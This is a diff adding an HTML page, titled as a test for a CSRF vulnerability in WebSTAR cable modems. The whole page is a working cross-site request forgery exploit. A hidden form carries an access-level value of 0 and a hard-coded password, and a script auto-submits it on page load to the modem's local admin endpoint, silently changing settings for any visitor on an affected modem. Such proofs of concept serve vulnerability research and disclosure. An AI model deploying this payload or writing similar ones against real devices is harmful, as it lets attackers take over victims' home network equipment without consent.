@@ -1,0 +1,16 @@
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Test for CSRF vulnerability in WebSTAR modems&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;form name=&quot;csrf&quot; method=&quot;post&quot; action=&quot;http://192.168.100.1/goform/_aslvl&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;SAAccessLevel&quot; value=&quot;0&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;SAPassword&quot; value=&quot;W2402&quot;&gt;
+&lt;/form&gt;
+
+&lt;script&gt;document.csrf.submit()&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
